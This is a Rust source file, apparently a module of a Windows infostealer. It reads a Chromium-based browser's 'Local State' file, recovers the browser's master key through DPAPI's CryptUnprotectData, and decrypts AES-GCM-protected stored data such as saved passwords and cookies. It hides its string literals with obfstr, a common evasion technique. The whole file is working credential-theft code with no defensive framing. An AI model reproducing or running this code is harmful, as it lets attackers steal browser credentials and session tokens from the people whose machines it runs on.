use crate::base64::{base64_decode_string};
use crate::path::Path;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::mem::zeroed;
use core::ptr::null_mut;
use core::slice;
use json::parse;
use obfstr::obfstr as s;
use windows_sys::Win32::Foundation::{LocalFree};
use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};

pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
    let mut in_blob = CRYPT_INTEGER_BLOB {
        cbData: data.len() as _,
        pbData: data.as_ptr() as *mut u8,
    };

    let mut out_blob: CRYPT_INTEGER_BLOB = zeroed();

    let success = CryptUnprotectData(
        &mut in_blob,
        null_mut(),
        null_mut(),
        null_mut(),
        null_mut(),
        0,
        &mut out_blob
    );

    if success == 0 {
        return None;
    }

    let decrypted = slice::from_raw_parts(out_blob.pbData, out_blob.cbData as _).to_vec();
    LocalFree(out_blob.pbData as _);
    Some(decrypted)
}

pub unsafe fn decrypt_data(buffer: &[u8], master_key: &[u8]) -> Option<String> {
    if buffer.is_empty() {
        return None
    }

    let mut iv = buffer[3..15].to_vec();
    let mut ciphertext = buffer[15..buffer.len() - 16].to_vec();

    let mut alg: BCRYPT_ALG_HANDLE = null_mut();
    let mut key: BCRYPT_KEY_HANDLE = null_mut();

    let status = BCryptOpenAlgorithmProvider(
        &mut alg,
        BCRYPT_AES_ALGORITHM,
        null_mut(),
        0
    );

    if status != 0 {
        return None;
    }

    let status = BCryptSetProperty(
        alg,
        BCRYPT_CHAINING_MODE,
        BCRYPT_CHAIN_MODE_GCM as *const _,
        utf16_bstrlen(BCRYPT_CHAIN_MODE_GCM) as _,
        0
    );

    if status != 0 {
        return None;
    }

    let status = BCryptGenerateSymmetricKey(
        alg,
        &mut key,
        null_mut(),
        0,
        master_key.as_ptr() as *mut _,
        master_key.len() as _,
        0
    );

    if status != 0 {
        return None
    }
    
    let pb_tag = &buffer[buffer.len() - 16..];

    let mut auth_into: BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = zeroed();
    auth_into.cbSize = size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as _;
    auth_into.dwInfoVersion = 1;
    auth_into.pbNonce = iv.as_mut_ptr();
    auth_into.cbNonce = iv.len() as _;
    auth_into.pbTag = pb_tag.as_ptr() as _;
    auth_into.cbTag = 16;
    
    let mut decrypted = Vec::with_capacity(ciphertext.len());
    decrypted.set_len(ciphertext.len());
    
    let mut decrypted_size: u32 = 0;

    let status = BCryptDecrypt(
        key,
        ciphertext.as_mut_ptr(),
        ciphertext.len() as _,
        &auth_into as *const _ as *const _,
        null_mut(),
        0,
        decrypted.as_mut_ptr(),
        decrypted.len() as _,
        &mut decrypted_size,
        0
    );
    
    if status != 0 {
        return None
    }
    
    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(alg, 0);
    
    Some(String::from_utf8_lossy(&decrypted[..decrypted_size as usize]).to_string())
}

unsafe fn utf16_bstrlen(s: *const u16) -> usize {
    let mut len = 0;
    while *s.add(len) != 0 {
        len += 1;
    }
    
    len * 2
}

pub unsafe fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
    let bytes = (user_data / s!("Local State")).read_file().ok()?;
    let parsed = parse(&bytes).unwrap();

    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(s!("encrypted_key"))?.as_string()?.clone();
    let key = base64_decode_string(&key_in_base64)?;
    let sliced_key = &key[5..];
    
    crypt_unprotect_data(sliced_key)
}